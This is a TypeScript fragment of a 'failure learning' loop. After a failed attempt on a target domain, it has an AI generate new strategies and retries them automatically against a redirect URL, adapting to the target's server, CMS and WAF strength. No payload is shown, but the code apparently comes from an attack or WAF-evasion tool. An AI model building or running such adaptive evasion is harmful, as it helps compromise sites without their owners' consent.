  const enableAutoRetry = options?.enableAutoRetry !== false; // default true

  // Step 1: Save failure
  if (options?.onProgress) {
    await options.onProgress("📊 บันทึก failure data...");
  }
  const analyticsId = await saveFailureAnalytics(failureRecord);

  // Step 2: Generate new strategies
  if (options?.onProgress) {
    await options.onProgress("🧠 AI วิเคราะห์ fail case แล้วคิดวิธีใหม่...");
  }
  const strategies = await generateNewStrategies(
    failureRecord.domain,
    failureRecord,
  );

  // Step 3: Execute adaptive retry (if enabled and strategies exist)
  let retryResult: AdaptiveRetryResult | null = null;
  if (enableAutoRetry && strategies.length > 0) {
    if (options?.onProgress) {
      await options.onProgress(`🔄 AI ทดสอบ ${strategies.length} วิธีใหม่อัตโนมัติ...`);
    }
    retryResult = await executeAdaptiveRetry(
      failureRecord.domain,
      redirectUrl,
      strategies,
      {
        maxRetries: options?.maxRetries || 2,
        onProgress: options?.onProgress,
      },
    );
  }

  // Step 4: Update strategy cache
  await updateStrategyCache(
    failureRecord.domain,
    failureRecord.mode,
    retryResult?.success || false,
    strategies[0],
    retryResult?.durationMs,
  );

  // Step 5: Get suggestion for next time
  let suggestion: ModeSuggestion | null = null;
  if (!retryResult?.success) {
    suggestion = await suggestBestMode(failureRecord.domain, {
      serverType: failureRecord.serverType,
      cms: failureRecord.cms,
      waf: failureRecord.waf,
      wafStrength: failureRecord.wafStrength,
    });
  }

  console.log(
    `[FailureLearning] 🔄 Learning loop complete for ${failureRecord.domain}: ` +
    `${strategies.length} strategies generated, retry=${retryResult?.success ? "SUCCESS" : retryResult?.attempted ? "FAILED" : "SKIPPED"}`
  );

  return { analyticsId, strategies, retryResult, suggestion };
}
